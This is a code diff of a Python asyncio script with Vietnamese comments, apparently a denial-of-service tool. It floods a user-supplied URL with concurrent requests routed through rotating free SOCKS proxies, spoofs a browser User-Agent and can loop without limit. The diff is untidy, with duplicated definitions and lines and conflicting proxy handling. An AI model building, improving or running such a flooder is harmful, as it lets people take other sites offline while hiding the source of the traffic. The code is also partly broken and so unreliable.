@@ -77,22 +77,20 @@ async def load_all_proxies():
 async def send_request(session, url, req_id, proxy):
     delay = random.uniform(MIN_DELAY, MAX_DELAY)
     await asyncio.sleep(delay)
-async def send_request(url, req_id, proxies):
-    proxy = random.choice(proxies)
+
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
     
     try:
-        # Tạo connector riêng cho mỗi proxy để tránh xung đột
-        connector = aiohttp_socks.ProxyConnector.from_url(proxy)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            # Tăng timeout lên 20 giây vì proxy free rất chậm
-            async with session.get(url, headers=headers, timeout=20) as resp:
-                await resp.read()
-                print(f"\033[92m[{req_id:6d}] ✅ {resp.status}\033[0m")
-                return 1
+        async with session.get(url, headers=headers, proxy=proxy, timeout=10) as resp:
+            await resp.read()
+            print(f"\033[92m[{req_id:6d}] ✅ {resp.status}\033[0m")
+            return 1
     except:
-        # Không in lỗi đỏ nữa để Termux chạy mượt hơn
+        print(f"\033[91m[{req_id:6d}] ❌ ERROR\033[0m")
         return 0
+
+async def main():
+    show_banner()
 
     url = input("\033[96mNhập URL website: \033[0m").strip()
     if not url.startswith("http"):
@@ -110,32 +108,19 @@ async def send_request(url, req_id, proxies):
 
     start_time = time.time()
     success = 0
-    start_time = time.time()
-    success = 0
-    tasks = []
-    i = 0
+    connector = aiohttp_socks.ProxyConnector.from_url(random.choice(proxies))
 
-    # Thay thế toàn bộ đoạn cũ bằng đoạn này:
-    async with aiohttp.ClientSession() as session:
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = []
+        i = 0
+
         while (total == 0 or i < total):
             i += 1
-            proxy_url = random.choice(proxies)
-            
-            # Kiểm tra nhanh nếu proxy thiếu dấu ':' (không có port) thì bỏ qua
-            if ":" not in proxy_url.replace("socks5://", ""):
-                continue
-
-            # Task gửi request
-            task = asyncio.create_task(send_request(session, url, i, proxy_url))
+            task = asyncio.create_task(send_request(session, url, i, random.choice(proxies)))
             tasks.append(task)
 
             if len(tasks) >= concurrency:
-                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
-                for t in done:
-                    try:
-                        if t.result() == 1: success += 1
-                    except: pass
-                tasks = list(pending)
+                done, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                 success += sum(1 for t in done if t.result() == 1)
                 tasks = [t for t in tasks if not t.done()]
 
